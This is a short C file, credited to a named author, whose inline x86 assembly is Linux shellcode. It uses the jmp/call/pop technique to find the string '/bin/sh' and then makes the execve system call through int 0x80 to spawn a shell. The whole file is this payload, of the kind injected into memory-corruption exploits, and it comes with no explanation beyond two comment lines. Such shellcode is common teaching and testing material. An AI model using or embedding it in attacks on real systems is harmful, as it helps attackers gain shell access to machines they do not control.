/*
Contact: Harrys Kon
Email: konharrys at gmail dot com

movb $0xb, %al     ;Number of the execve(2) syscall
int 0x80           ;Execute the syscall
*/

int main(int argc, char **argv)
{
	asm("\
		shell_start:                 \n\
		jmp transfer                 \n\
		code: pop %ebx               \n\
		xor %eax, %eax               \n\
		movb $0xb, %al               \n\
		xor %ecx, %ecx               \n\
		xor %edx, %edx               \n\
		int $0x80                    \n\
		transfer: call code          \n\
		.string \"/bin/sh\"          \n\
		shell_end: .octa 0xdeadbeef  \n\
	");
}
